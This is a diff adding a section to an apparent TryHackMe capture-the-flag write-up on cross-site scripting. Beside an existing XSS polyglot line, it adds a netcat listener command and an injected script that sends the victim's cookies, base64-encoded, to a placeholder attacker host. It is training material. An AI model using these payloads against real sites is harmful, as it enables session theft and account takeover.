@@ -685,6 +685,20 @@ now decoded the flag
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
 ```
 
+### Challenge 
+
+setup a receiving server like netcat
+
+```
+nc -nlvp 9001
+```
+
+This will send the cookies (with high privilege) to our server 
+</textarea><script>fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );</script> 
+
+![xss](./media/5-xss.png)
+
+
 ---
 
 ## MY TAKEAWAYS
